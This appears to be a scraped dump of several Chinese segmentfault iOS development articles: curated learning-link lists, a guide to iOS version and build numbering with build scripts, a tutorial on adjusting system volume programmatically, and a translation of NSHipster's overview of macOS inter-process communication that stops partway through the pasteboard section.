  <p>GitHub 地址: <a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS"">https://github.com/Aufree/trip-to-iOS</a><br>
  未来我会在<a rel=""nofollow"" href=""http://weibo.com/jinfali"">微博</a>不定时推送一些较新的第三方的库的使用, 欢迎关注 :D</p>
</blockquote>

                ", iOS 学习资料整理,1531972158,308,1,540,1,1,https://segmentfault.com/a/1190000002473595
177,1,0,6,"
                    
<p>过去几年里我和我的团队做的事情太杂了，甚至还扑在了cocos2d-x上，接下来终于可以专注在iOS和Android原生开发领域了，所以今天特意花了一天时间补课，把唐巧的博客截止到今天(2014.12.19)的好文都看了一遍，特此收藏一些有价值的文章：</p>

<ul>
<li><a rel=""nofollow"" href=""http://tangqiaoboy.gitcafe.com/blog/2013/01/23/set-ios-system-ui-language/"">设置系统控件的语言，比如用户选择一段文本后跳出来的复制/粘贴等按钮文字的语言</a></li>
<li>
<a rel=""nofollow"" href=""http://tangqiaoboy.gitcafe.com/blog/2012/11/14/make-stack-trace-more-readable/"">程序崩溃时不再傻乎乎地跳到main.m里，而是停在代码处（文中方法二）</a> 附注：另外也可以在lldb停下时输入bt查看堆栈，如果堆栈没有有效信息的话就用Instruments工具分析Zombies</li>
<li><a rel=""nofollow"" href=""http://wufawei.com/2014/03/symbolicating-ios-crash-logs/"">符号化Crash文件（暂时用不到，不过将来会有用）</a></li>
<li><a rel=""nofollow"" href=""http://objcio.com/blog/2014/03/10/custom-controls/"">老外写的文章翻译过来的，读起来比较晦涩，但还是能更好地理解UIResponder/UIView/UIControl之间的关系，以及Core Animation/Core Graphics/OpenGL ES这三者之间的关系</a></li>
<li><a rel=""nofollow"" href=""http://www.starfelix.com/blog/2014/03/17/lldbdiao-shi-ming-ling-chu-tan/"">lldb的常用命令比如bt、po是必须要会的</a></li>
<li><a rel=""nofollow"" href=""http://stuartkhall.com/posts/android-development-tips-for-ios-devs"">非常实用的iOS程序员转向Android开发时的注意事项，特别是Android模拟器那段的描述，跟我们自己的感触一模一样，笑死我了</a></li>
<li><a rel=""nofollow"" href=""http://beyondvincent.com/blog/2014/03/19/18-tips-for-working-effectively-with-interface-builder/"">非常实用的Interface Builder使用小技巧，比如Cmd+=自动适应尺寸、Embed In View等</a></li>
<li><a rel=""nofollow"" href=""https://www.gitignore.io/"">gitignore.io：.gitignore文件的快速生成</a></li>
<li><a rel=""nofollow"" href=""http://www.yidianzixun.com/article/news_eaf23f7ff41d4862ecbf0d10441cf5f5?s=1"">讲ARM处理器的好文章，必须硬着头皮读一遍，肤浅地理解一些硬件层面上的知识</a></li>
<li>~~<a rel=""nofollow"" href=""http://segmentfault.com/a/1190000000390012"">通篇都是错别字，但却是理解iOS绘制渲染、Core Animation、Core Graphics、OpenGL ES的必读文章！</a> 译文错别字实在太多极不严谨（但仍然感谢译者）~~，建议英语凑合过得去的直接去读<a rel=""nofollow"" href=""http://www.objc.io/issue-3/moving-pixels-onto-the-screen.html"">原文</a>。这里还有一个<a rel=""nofollow"" href=""http://ww2.sinaimg.cn/large/61b207a9gw1ecg1q0brc5j21j03dynpd.jpg"">思维导图</a>。 后记：<a rel=""nofollow"" href=""http://objccn.io/issue-3-1/"">objccn.io上的这篇译文质量不错，建议直接读这篇。</a>
</li>
<li><a rel=""nofollow"" href=""http://studentdeng.github.io/blog/2014/02/11/baidu-interview/"">这个人写了自己面试百度iOS开发职位的一些题目，值得一读，反省一下自己是什么水平。估计有些人觉得自己已经开发上架了好几个APP还自我感觉不错都会被虐到渣都不剩，而且题目一点都不刁钻，全是基础，就看你基础概念掌握的牢不牢固了，这就是我常说的正规军和游击队的区别</a></li>
<li><a rel=""nofollow"" href=""http://stackoverflow.com/questions/25766747/emulating-aspect-fit-behaviour-using-autolayout-constraints-in-xcode-6"">StackOverflow上讲constrains最清晰易懂的神贴！初学者必须看！！！作者是个大好人</a></li>
<li><a rel=""nofollow"" href=""http://blog.xcodev.com/archives/objective-c-naming/"">关于变量和方法命名非常好的总结，怪不得我总觉得Objective-c和Ruby是我用下来最舒服的两种语言，因为变量命名真是一种学问，这方面iOS系统是典范，值得学习并在自己的项目里严格遵循相同的规范！</a></li>
<li><a rel=""nofollow"" href=""http://blog.sunnyxx.com/2014/08/02/objc-weird-code/"">Objective-C语法技巧，其中<strong>小括号内联复合表达式</strong>值得大力推广！</a></li>
<li><a rel=""nofollow"" href=""http://www.paintcodeapp.com/news/iphone-6-screens-demystified"">iPhone 6/6 Plus是怎么做老APP的兼容性自动适配的，看看就好，反正以后不会用老式兼容的方法去开发新的APP了</a></li>
<li><a rel=""nofollow"" href=""http://nshipster.cn/uialertcontroller/"">居然连UIAlertView都deprecated了……</a></li>
<li>
<a rel=""nofollow"" href=""http://www.jianshu.com/p/bd071f9a558d"">叶孤城的SizeClass和AutoLayout教程1</a>、<a rel=""nofollow"" href=""http://www.jianshu.com/p/a4cf3db81c0b"">教程2</a>、<a rel=""nofollow"" href=""http://www.jianshu.com/p/3d6b2341fd83"">教程3</a>、<a rel=""nofollow"" href=""http://www.jianshu.com/p/e72e957497b3"">教程4</a>，AutoLayout和SizeClass的入门文章</li>
<li><a rel=""nofollow"" href=""http://objccn.io/"">objc中国的这一系列文章值得挑选着看一遍，非常受益</a></li>
<li><a rel=""nofollow"" href=""http://msching.github.io/blog/2014/07/07/audio-in-ios/"">简单理解一下音频播放的相关概念，了解AVFoundation、AudioQueue、AudioConverter之间的关系</a></li>
<li>
<a rel=""nofollow"" href=""https://github.com/nixzhu/dev-blog/blob/master/2014-04-19-grand-central-dispatch-in-depth-part-1.md"">GCD深入理解第一部分</a> <a rel=""nofollow"" href=""https://github.com/nixzhu/dev-blog/blob/master/2014-05-14-grand-central-dispatch-in-depth-part-2.md"">第二部分</a> GCD必须轻车熟路，否则没法流畅</li>
<li><a rel=""nofollow"" href=""http://www.appcoda.com/introduction-auto-layout/"">Introduction To AutoLayout</a></li>
<li>
<a rel=""nofollow"" href=""http://www.jianshu.com/p/3006502912aa"">叶孤城的视频特效制作1</a> <a rel=""nofollow"" href=""http://www.jianshu.com/p/6313025349a9"">视频特效制作2</a>
</li>
<li><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/navigation/"">最后当然少不了苹果的官方文档啦，其实这才是宝库</a></li>
</ul>

                ", 唐巧的iOS技术博客好文列表,1531972159,250,1,335,1,1,https://segmentfault.com/a/1190000002435233
178,1,0,6,"
                    
<p><a rel=""nofollow"" href=""http://fir.im"">FIR.im</a> 一直在尽量兼容不同使用习惯的版本号形式, 但是在使用中我们发现好多开发者对怎么更好的用版本号来标示应用很陌生. 这是篇基础文章, 简单介绍 iOS 的版本号.</p>

<p><span class=""img-wrap""><img data-src=""http://firclub.qiniudn.com/FoSuESkBT9ubPjLRJm6c57uFe0m4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""version-1.jpg""></span></p>



<h2>名词解释</h2>

<ul>
<li>Version, 通常说的版本号, 是应用向用户宣传说明时候用到的标识. 一般有2段或者3段式, 如:<code>2.1</code>,<code>8.1.2</code>
</li>
</ul>
<p><code>Version</code> 一般由产品部门确定, 完全迥异的更新需要改变主版本号, 比如 <code>QQ 4.0</code> 的变化非常大, 主版本的变化会更加吸引用户的眼球,所以有的应用会频繁的更新主版本号, 比如 <code>FireFox 20.0</code> . 两段式的副版本号既包含小功能更新也会包含 bug 修复等,三段式副版本基本都是新功能添加和大问题修复,第三段则表示稳定版本基本都是修复 bug</p>

<ul>
<li>Build , 编译号指一次唯一编译标识, 通常是一个递增整数(安卓强制为数字, iOS 可以是字符串)</li>
</ul>
<p><code>Build</code> 都是给内部使用, 用来确定一个唯一版本. 与前面提到的 Version 不会有太大联系.</p>

<p><strong>iOS 开发中,这个2个号码都可以任意字符串或数字.</strong></p>

<p>我们目前遇到的情况有:</p>

<ul>
<li>忽略了 Version 或 Build. 这两个号中的一个常年的不会发生变化.</li>
<li>颠倒了 Version 和 Build.</li>
</ul>
<p><span class=""img-wrap""><img data-src=""http://firclub.qiniudn.com/FvIegW3X0g5_RWpXduMzb3kRyIJF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""version-2.jpg""></span></p>

<p>获取方法也很简单:</p>

<pre><code>NSDictionary *info= [[NSBundle mainBundle] infoDictionary];

info[@""CFBundleShortVersionString""]; //Version
info[@""CFBundleVersion""]; // Build
</code></pre>

<h2>为什么使用版本号</h2>

<h3>1. 方便标示和沟通</h3>

<p>前面提到 版本号更新会给推广产生一定的积极作用. 所以版本号不要太长, 如果像这样 ""我们隆重推出了 某某某 1.7.14.19257 !"", 这个会让用户感觉很乏味很像电视购物,而且也不利于传播. 如果是 ""某某 3.0, 大有不同 !""可能就会产生更好的沟通效果.</p>

<h3>2. 方便追踪 Bug</h3>

<p>一个应用有 Bug 是肯定的, 但是很快的定位解决问题却体现出团队和程序员的能力. 我们经常遇到有开发者说我提交一个版本, 但是下载下来有还是旧的. 我们帮他解决问题的时候,他自己都搞不清哪个是哪个了, 如果能在""关于""之类的地方显示当前的版本, 就会容易找到问题.</p>

<p>或者是测试团队的同事, 可能手里同时有几个不同分支的版本在测试, 他们需要精确的描述一个测试版本.</p>

<h2>自动改变 Build 号</h2>

<p>前面提到, <code>Version</code> 是不需要自动变化的, 根据产品或者市场部门的需求,适时的手动改一下就好.</p>

<h3>1. agvtool (Apple-generic versioning tool)</h3>

<p><a rel=""nofollow"" href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man8/agvtool.8.html"">agvtool</a>, 是苹果的命令行工具, 也是集成在 Xcode 中最方便的工具.  我们在自动编译 SDK 的脚本中用的就是这个方法. 其实就用了一行(其他的高级用法可以参考前面的链接):</p>

<pre><code>agvtool next-version
</code></pre>

<p>使用前需要在 Xcode 里简单配置一下, 如图:</p>

<p><span class=""img-wrap""><img data-src=""http://firclub.qiniudn.com/FitXOnXNdQbUpoRRWuiCa9VgtfmF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""version-3.jpg""></span></p>

<h3>2. 基于SCM的版本控制号</h3>

<p>SCM 现在常用的有 Git 和 SVN, 还有一些相对小众的比如 hg 这里就不多做介绍了.<br>
如果用 Git/SVN 来管理代码(相信已经没有人不用了) 我们可以用代码的提交次数来代替Build号.</p>

<ul>
<li>Git</li>
</ul>
<pre><code>REV=`git rev-list HEAD | wc -l | awk '{print $1}'`
</code></pre>

<p>其中 <code>HEAD</code>是分支名, 代表当前分支, 可以直接替换成其他分支名, 比如<code>master</code>,<code>dev</code>.<br>
这个脚本放到</p>

<ul>
<li>SVN</li>
</ul>
<pre><code>REV=`svnversion -nc | sed -e 's/^[^:]*://;s/[A-Za-z]//'`
</code></pre>

<p>后面都是一样的:</p>

<pre><code>/usr/libexec/PlistBuddy -c ""Set :CFBundleVersion ${REV}"" ""${TARGET_BUILD_DIR}""/${INFOPLIST_PATH}
</code></pre>

<p>这样每次编译app的时候就自动把版本号加到Info.plist的<code>CFBundleVersion</code>键值下</p>

<p>把上面2行代码 加到 ""Build Phase &gt; Run Script""就可以了:</p>

<p><span class=""img-wrap""><img data-src=""http://firclub.qiniudn.com/FsHdTgeR_CAVjwTQTz0N9j-R1ZIV"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""version-4.jpg""></span></p>

<h3>3. 基于日期时间</h3>

<p>用发布日期作为版本好也是许多应用常用的方式, 因为好记好理解. 这里直接附上代码:</p>

<pre><code>REV=`date +%y%m%d`  #输出格式141120的六位日期格式,可以根据自己喜欢改变格式
</code></pre>

<p>后面都是一样的:</p>

<pre><code>/usr/libexec/PlistBuddy -c ""Set :CFBundleVersion ${REV}"" ""${TARGET_BUILD_DIR}""/${INFOPLIST_PATH}
</code></pre>

<p>使用方法同上.</p>

<h2>怎么使用</h2>

<p>只要配置好了版本号, 其他的事情就不需要人工干预了, 这里介绍2种使用场景.</p>

<h3>1. Crash 收集</h3>

<p>收集 Crash 是应用开发必要的环节, 通过分析和修复 Crash 信息可以大大提高应用的稳定性而不会让更多的用户失望甚至删除应用.<br>
目前有很多收集工具, 比如 FIR.im 旗下的<a rel=""nofollow"" href=""http://bughd.com/demo/ios"">BugHD</a>, Crashlytics等.</p>

<p><span class=""img-wrap""><img data-src=""http://firclub.qiniudn.com/Fk8-VkIqnU7M1a9XQdTPrHOP-_Ns"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""version-5.jpg""></span></p>

<h3>2. 用户反馈</h3>

<p>能主动反馈问题的用户都是极品用户, 不管要求是不是合理我们都要认真对待.<br>
不管是用各种 SDK 还是用 Email 都要尽量的带上版本号, 系统信息, 方便确认用户需求.最不济也要在""关于""里面能让用户找到相关的版本信息以便描述问题.</p>

                ", 浅谈 iOS 版本号 ,1531972161,548,1,965,1,1,https://segmentfault.com/a/1190000002423661
179,1,0,6,"
                    
<p>iOS的AVFoundation框架提供了基本的音视频播放工具，我们基本上可以靠其中提供的类完成绝大部分的音视频播放任务。但是在音频播放的输出音量的处理上，苹果的策略比较保守。尽管<code>AVPlayer</code>和<code>AVPAudiolayer</code>zhe这些类提供了音量调节功能，但这些音量控制属于App级别的控制。好处就是音量调节独立于系统音量，调节大小时不会影响系统音量。但有时候我们可能希望修改系统音量，以免在调节声音的时候，如果系统音量过小，App调节音量效果不明显。一般来说要调节系统音量会有以下方法：</p>

<p><strong>请注意：修改系统音量无法在模拟器上看到效果，必须使用真机调试才能看到效果！</strong></p>

<h2>使用<code>MPVolumeView</code>
</h2>

<p>这个方法是苹果官方推荐的方法。<code>MPVolumeView</code>是Media Player Framework中的一个UI组件，直接包含了对系统音量和Airplay设备的音频镜像路由的控制功能。其中包含一个<code>MPVolumeSlider</code>的subview用来控制音量。这个<code>MPVolumeSlider</code>是一个私有类，我们无法手动创建此类，但这个类是<code>UISlider</code>的子类。<code>MPVolumeView</code>的使用很简单，只需要将其加入到一个父视图中，给予父视图合适的大小，再创建<code>MPVolumeView</code>示例，将其加入到父视图中即可，苹果官方的文档<a class=""footnote-ref"">1</a>中有示例代码可以参考。</p>

<p>这个方法的缺点如下：</p>

<ul>
<li>
<strong>UI可定制的的程度低。</strong>  <code>MPVolumeView</code>只提供了有限的几个方法来定制其中的Slider和Route Button的样式，而且基本上只能靠换图片解决。如果你想把Slider操作换成Button或者其他的UI组件，那是不可能的。</li>
<li>
<strong>没有额外的音量控制API。</strong>  目前为止没有发现iOS的公开API中有可以直接操作系统音量的，所以修改系统音量只能使用这个UI组件。</li>
</ul>
<p>如果还想给UI加入手势操作来控制音量，这种直接使用<code>MPVolumeView</code>是做不到的，那么有没有什么方法可以绕过这限制呢？办法还是有的。</p>

<h2>编程实现系统音量调节<a class=""footnote-ref"">2</a>
</h2>

<p>上一小节我们提到了<code>MPVolumeView</code>这个组件中，有一个subview来控制音量，即<code>MPVolumeSlider</code>。其实我们可以通过遍历<code>MPVolumeView</code>实例的subviews来得到<code>MPVolumeSlider</code>的实例，从而通过这个UI组件来操作系统音量。</p>

<h3>通过<code>MPVolumeSlider</code>的实例来操作系统音量</h3>

<p>我们首先通过创建一个<code>MPVolumeView</code>，然后遍历找出<code>MPVolumeSlider</code>的实例。这个实例提供<code>setValue:animated:</code>方法来设置系统音量。我们也可以通过<code>volumeSlider.value</code>这个属性来获取当前的系统音量。具体的代码如下：</p>

<pre><code>MPVolumeView *volumeView = [[MPVolumeView alloc] init];
UISlider* volumeViewSlider = nil;
for (UIView *view in [_instance.volumeView subviews]){
    if ([view.class.description isEqualToString:@""MPVolumeSlider""]){
        volumeViewSlider = (UISlider*)view;
        break;
    }
}

// retrieve system volume
float systemVolume = volumeViewSlider.value;

// change system volume, the value is between 0.0f and 1.0f
[volumeViewSlider setValue:1.0f animated:NO];

// send UI control event to make the change effect right now.
[volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
</code></pre>

<p>上面的代码演示如何获取和修改系统音量，注意音量取值为0到1之间的浮点数。</p>

<h3>有问题！我不喜欢系统弹出音量提示</h3>

<p>上面通过编程的方法可以很完美的调节系统音量，但是每次修改都会弹出系统提示框告知：<br><span class=""img-wrap""><img data-src=""/img/bVkeZ9"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""iOS音量提示""></span><br>
有时候这种提示我们未必会需要，那么怎么取消掉这个提示呢？实际上<code>MPVolumeView</code>没有提供任何接口来调节是否需要显示系统音量提示。但是我们发现一点：<strong>当<code>MPVolumeView</code>处在当前视图的层级之中时，系统就不会显示音量提示</strong>。那么事情好办了，我们只要确保两点：</p>

<ul>
<li>
<code>MPVolumeView</code>视图处在屏幕上看不见的地方，比如某个不透明视图的下方，或者本视图的非可见区域，一个常见的做法就是把该视图的frame设置为区域以外的地方，比如<code>volumeView.frame = CGRectMake(-1000, -100, 100, 100);</code>
</li>
<li>确保<code>MPVolumeView</code>视图的hidden属性值为<code>NO</code>。因为当hidden为<code>YES</code>时，同样会弹出提示。</li>
</ul>
<h3>还有问题，我修改了系统音量但是不是通过我的UI</h3>

<p>另一个可能的情况就是用户自己通过硬件的音量调节按钮（位于设备侧边）来调节音量，这种情况会使得你的业务逻辑出现问题，因为你只为自己的App UI写了回调，那么怎么为硬件按钮的事件添加回调呢？我们可以使用Notification Center来完成。<br>
这里只需要监听<code>AVSystemController_SystemVolumeDidChangeNotification</code>事件即可。具体代码如下：</p>

<ul>
<li>首先在资源载入阶段加入监听事件的代码</li>
</ul>
<pre><code>NSError *error;
// Active audio session before you listen to the volume change event.
// It must be called first.
// The old style code equivalent to the line below is:
//
// AudioSessionInitialize(NULL, NULL, NULL, NULL);
// AudioSessionSetActive(YES);
//
// Now the code above is deprecated in iOS 7.0, you should use the new
// code here.
[[AVAudioSession sharedInstance] setActive:YES error:&amp;error];

// add event handler, for this example, it is `volumeChange:` method
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(volumeChanged:) name:@""AVSystemController_SystemVolumeDidChangeNotification"" object:nil];
</code></pre>

<ul>
<li>然后实现事件回调方法</li>
</ul>
<pre><code>- (void)volumeChanged:(NSNotification *)notification
{
    // service logic here.
}
</code></pre>

<ul>
<li>最后记得在资源回收时取消掉事件监听</li>
</ul>
<pre><code>- (void)dealloc
{
    [[NSNotificationCenter defaultCenter] removeObserver:self name:@""AVSystemController_SystemVolumeDidChangeNotification"" object:nil];
}
</code></pre>

<p>这样，每次用户使用硬件按钮调节音量的时候也会执行你写好的逻辑。</p>

<p>以上除了第一个方案以外，所有的解决方案都属于非官方的hack性质的方法，但是都没有调用私有API，所以没有被Apple审核拒掉的风险。</p>


<hr>
<ol>
<li>
<p><a rel=""nofollow"" href=""https://developer.apple.com/Library/ios/documentation/MediaPlayer/Reference/MPVolumeView_Class/index.html"">MPVolumeView Class Reference</a> <a rev=""footnote"" class=""footnote-backref"">↩</a></p>
</li>

<li>
<p>本节代码和思想参考了<a rel=""nofollow"" href=""http://blog.stormyprods.com/2009/06/adjusting-iphone-master-volume.html"">Adjusting the iPhone master volume programmatically</a> <a rev=""footnote"" class=""footnote-backref"">↩</a></p>
</li>

</ol>

                ", iOS编程修改系统音量,1531972163,404,1,217,1,1,https://segmentfault.com/a/1190000002401961
180,1,0,6,"
                    
<p><strong>原文链接：<a rel=""nofollow"" href=""http://nshipster.com/inter-process-communication/"">http://nshipster.com/inter-process-communication/</a></strong></p>

<h2>总起</h2>

<p>OS X是MacOS与NeXTSTEP的结合。OC是Smalltalk类面向对象编程与C的结合。iCloud则是苹果移动服务与云平台的结合。</p>

<p>上述都是一些亮点，但是不得不说苹果技术中的进程通讯走的是“反人类”的道路。</p>

<p>由于不是根据每个节点上最优原则进行设计，苹果的进程间通信解决方案更显得混乱扎堆。结果是，大量重叠，不兼容的IPC技术在各个抽象层随处可见。（除了GCD还有剪贴板）</p>

<ul>
<li>Mach Ports</li>
<li>Distributed Notifications</li>
<li>Distributed Objects</li>
<li>AppleEvents &amp; AppleScript</li>
<li>Pasteboard</li>
<li>XPC</li>
</ul>
<p>从低级内核抽象到高级，面向对象的API，它们都有各自特殊的表现以及安全特性。但是基础层面来看，它们都是从不同上下文段传递或者获取数据的机制。</p>

<h2>分述</h2>

<h3>Mach Ports</h3>

<p>所有的进程间通讯最终落实依赖的还是Mach内核API提供的功能。</p>

<p>Mach端口是轻量并且强大的而又缺少相关文档晦涩使用的（天使与恶魔）。</p>

<p>通过一个Mach端口发送一个消息调用一次<code>mach_msg_send</code>方法，但是这里需要做一些配置来构建待发送的消息：</p>

<pre><code>natural_t data;
mach_port_t port;

struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_type_descriptor_t type;
} message;

message.header = (mach_msg_header_t) {
    .msgh_remote_port = port,
    .msgh_local_port = MACH_PORT_NULL,
    .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0),
    .msgh_size = sizeof(message)
};

message.body = (mach_msg_body_t) {
    .msgh_descriptor_count = 1
};

message.type = (mach_msg_type_descriptor_t) {
    .pad1 = data,
    .pad2 = sizeof(data)
};

mach_msg_return_t error = mach_msg_send(&amp;message.header);

if (error == MACH_MSG_SUCCESS) {
    // ...
}
</code></pre>

<p>（消息）接收端稍微轻松点，因为消息只需要被声明而不用初始化：</p>

<pre><code>mach_port_t port;

struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_type_descriptor_t type;
    mach_msg_trailer_t trailer;
} message;

mach_msg_return_t error = mach_msg_receive(&amp;message.header);

if (error == MACH_MSG_SUCCESS) {
    natural_t data = message.type.pad1;
    // ...
}
</code></pre>

<p>还算不错的是，<code>Core Foundation</code>和<code>Foundation</code>为Mach端口提供了高级API。在内核基础上封装的<code>CFMachPort / NSMachPort</code>可以用做<code>runloop</code>源，尽管<code>CFMachPort / NSMachPort</code>有利于的是两个不同端口之间的通讯同步。</p>

<p><code>CFMessagePort</code>确实非常适合用于简单的一对一通讯。简简单单几行代码，一个本地端口就被附属到runloop源上，只要获取到消息就执行回调。</p>

<pre><code>static CFDataRef Callback(CFMessagePortRef port,
                          SInt32 messageID,
                          CFDataRef data,
                          void *info)
{
    // ...
}

CFMessagePortRef localPort =
    CFMessagePortCreateLocal(nil,
                             CFSTR(""com.example.app.port.server""),
                             Callback,
                             nil,
                             nil);

CFRunLoopSourceRef runLoopSource =
    CFMessagePortCreateRunLoopSource(nil, localPort, 0);

CFRunLoopAddSource(CFRunLoopGetCurrent(),
                   runLoopSource,
                   kCFRunLoopCommonModes);
</code></pre>

<p>若要进行发送数据同样也十分直截了当。只要完成指定远端的端口，装载数据，还有设置发送与接收的超时时间的操作。剩下就由<code>CFMessagePortSendRequest</code>来接管了。</p>

<pre><code>CFDataRef data;
SInt32 messageID = 0x1111; // Arbitrary
CFTimeInterval timeout = 10.0;

CFMessagePortRef remotePort =
    CFMessagePortCreateRemote(nil,
                              CFSTR(""com.example.app.port.client""));

SInt32 status =
    CFMessagePortSendRequest(remotePort,
                             messageID,
                             data,
                             timeout,
                             timeout,
                             NULL,
                             NULL);
if (status == kCFMessagePortSuccess) {
    // ...
}
</code></pre>

<h3>Distributed Notifications</h3>

<p>在Cocoa中有很多种两个对象进行通信的途径。</p>

<p>当然也能进行直接消息传递。也有像目标-动作，代理，回调这些解耦，一对一的设计模式。KVO允许让很多对象订阅一个事件，但是它把这些对象都联系起来了。另一方面通知让消息全局广播，并且让有监听该广播的对象接收该消息。【注：想知道发了多少次广播吗？添加 <code>NSNotificationCenter addObserverForName:object:queue:usingBlock</code>，其中name与object置nil，看block被调用了几次。】</p>

<p>每个应用为基础应用消息发布-订阅对自身通知中心实例进行管理。但是鲜有人知的API<code>CFNotificationCenterGetDistributedCenter</code>的通知可以进行系统级别范围的通信。</p>

<p>为了获取通知，添加所要指定监听消息名的观察者到通知发布中心，当消息接收到的时候函数指针指向的函数将被执行一次：</p>

<pre><code>static void Callback(CFNotificationCenterRef center,
                     void *observer,
                     CFStringRef name,
                     const void *object,
                     CFDictionaryRef userInfo)
{
    // ...
}

CFNotificationCenterRef distributedCenter =
    CFNotificationCenterGetDistributedCenter();

CFNotificationSuspensionBehavior behavior =
        CFNotificationSuspensionBehaviorDeliverImmediately;

CFNotificationCenterAddObserver(distributedCenter,
                                NULL,
                                Callback,
                                CFSTR(""notification.identifier""),
                                NULL,
                                behavior);
</code></pre>

<p>发送端代码更为简单，只要配置好ID,对象还有<code>user info</code>：</p>

<pre><code>void *object;
CFDictionaryRef userInfo;

CFNotificationCenterRef distributedCenter =
    CFNotificationCenterGetDistributedCenter();

CFNotificationCenterPostNotification(distributedCenter,
                                     CFSTR(""notification.identifier""),
                                     object,
                                     userInfo,
                                     true);
</code></pre>

<p>链接两个应用通信的方式中，分发式通知是最为简单的。用它来进行大量数据的传输是不明智的，但是对于轻量级信息同步，分发式通知堪称完美。</p>

<h3>Distributed Objects</h3>

<p>90年代中NeXT全盛时期，分发式对象（DO）是Cocoa框架中一个远程消息发送特性。尽管现在已经不再大范围的使用，在现代奇数层上IPC无障碍通信仍然并未实现。</p>

<p>使用DO分发一个对象仅仅是搭建一个<code>NSConnection</code>并将其注册为特殊（你分的清楚）的名字：</p>

<pre><code>@protocol Protocol;

id &lt;Protocol&gt; vendedObject;

NSConnection *connection = [[NSConnection alloc] init];
[connection setRootObject:vendedObject];
[connection registerName:@""server""];
</code></pre>

<p>另外一个应用将会也建立同样名字的并注册过的链接，然后立即获取一个原子代理当做原始对象。</p>

<pre><code>id proxy = [NSConnection rootProxyForConnectionWithRegisteredName:@""server"" host:nil];
[proxy setProtocolForProxy:@protocol(Protocol)];
</code></pre>

<p>只要分发对象代理收到消息了，一个通过<code>NSConnection</code>连接远程调用（RPC）将会根据发送对象进行对应的计算并且返回结果给代理。【注：原理是一个OS管理的共享的<code>NSPortNameServer</code>实例对这个带着名字的连接进行管控。】</p>

<p>分发式对象简单，透明，健壮。简直就是Cocoa中的标杆。。。</p>

<p>实际上，分布式对象不能像局部对象那样使用，那就是因为任何发送给代理的消息都可能抛出异常。不想其他语言，OC没有异常处理控制流程。所以对任何东西都进行<code>@try/@catch</code>也算是Cocoa大会很凄凉的补救了。</p>

<p>DO还有一个原因致其使用不便。在试图通过连接“marshal values”时，对象和原语的差距尤为明显。<br>
此外，连接是完全加密的，和下方通信信道扩展性的缺乏致使其在大多数的使用中通信被迫中断。</p>

<p>下方是左列分布式对象用来指定其属性代理行为和方法参数的注解：</p>

<ul>
<li>in：输入参数，后续不再引用</li>
<li>out：参数被引用作为返回值</li>
<li>inout：输入参数，引用作为返回值</li>
<li>const：常量参数</li>
<li>oneway：无障碍结果返回</li>
<li>bycopy：返回对象的拷贝</li>
<li>byref：返回对象的代理</li>
</ul>
<h3>AppleEvents &amp; AppleScript</h3>

<p><strong>AppleEvents</strong>是经典<strong>Macintosh</strong>操作系统最持久的遗产。在<strong>System 7</strong>推出的<strong>AppleEvents</strong>允许应用程序在本地使用<strong>AppleScript</strong>或者使用程序链接的功能进行程序控制。现在<strong>AppleScript</strong>使用<strong>Cocoa Scripting Bridge</strong>，仍然是OS X应用进程间最直接的交互方式。【注：Mac系统的苹果时间管理中心为<strong>AppleEvents</strong>提供了原始低级传送机制，但是是在OS X的Mach端口基础之上的重实现】。</p>

<p>也就是说，使用起来这是简单而又古怪的技术之一。</p>

<p><strong>AppleScript</strong>使用自然语言语法，设计初衷是没有涉及参数而更容易掌握。虽然与人交流更亲和了，但是写起来确实噩梦。</p>

<p>为了更好的了解人类自然性，这里有个栗子教你怎么让Safari在最前的窗口的激活栏打开一个URL。</p>

<pre><code>tell application ""Safari""
  set the URL of the front document to ""http://nshipster.com""
end tell
</code></pre>

<p>在大部分情况下，<strong>AppleScript</strong>的语法自然语言的特性更多是不便不是优势。（吐槽。。。略略略）</p>

<p>即便是经验老道的OC开发者，不靠文档或者栗子写出<strong>AppleScript</strong>是不可能的任务。</p>

<p>幸运的是，<strong>Scripting Bridge</strong>为Cocoa应用提供了更友善的编程接口。</p>

<h4>Cocoa Scripting Bridge</h4>

<p>为了使用<strong>Scripting Bridge</strong>与应用进行交互，首先要先添加一个编程接口：</p>

<pre><code>$ sdef /Applications/Safari.app | sdp -fh --basename Safari
</code></pre>

<p><code>sdef</code>为应用生成脚本定义文件。这些文件可以以管道输入道<code>sdp</code>并格式转成（在这里是）C头文件。这样的结果是添加该头文件到应用工程并提供第一类对象接口。</p>

<p>这里举个栗子来解释如何使用<strong>Cocoa Scripting Bridge</strong>：</p>

<pre><code>#import ""Safari.h""

SafariApplication *safari = [SBApplication applicationWithBundleIdentifier:@""com.apple.Safari""];

for (SafariWindow *window in safari.windows) {
    if (window.visible) {
        window.currentTab.URL = [NSURL URLWithString:@""http://nshipster.com""];
        break;
    }
}
</code></pre>

<p>对比<strong>AppleScript</strong>上面显得冗繁了点，但是却更容易集成到已存在的代码中去。在可读性上更优因为毕竟长得更像OC。</p>

<p>唉，<strong>AppleScript</strong>的星芒也正出现消退，在最近发布的OS X与iWork应用证答复减少它的戏份。从这点说，未必值得在你的应用中去添加这项（脚本）支持。</p>

<h3>Pasteboard</h3>

<p>剪贴板是OS X与iOS最常见的进程间通信机制。当用户跨应用拷贝了一段文字，图片，文档，这时候通过<strong>mach port</strong>的<code>com.apple.pboard</code>服务媒介进行从一个进程到另一个进程的数据交换。</p>

<p>OS X上是<code>NSPasteboard</code>，iOS上对应的是<code>UIPasteboard</code>。它们几乎是别无二致，但尽管大致一样，对比OS X iOS上提供了更简洁，更现代化却又不影响功效的API。</p>

<p>编写剪贴板代码几乎就跟在GUI应用上使用<code>Edit &gt; Copy</code>操作一样简单：</p>

<pre><code>NSImage *image;

NSPasteboard *pasteboard = [NSPasteboard generalPasteboard];
[pasteboard clearContents];
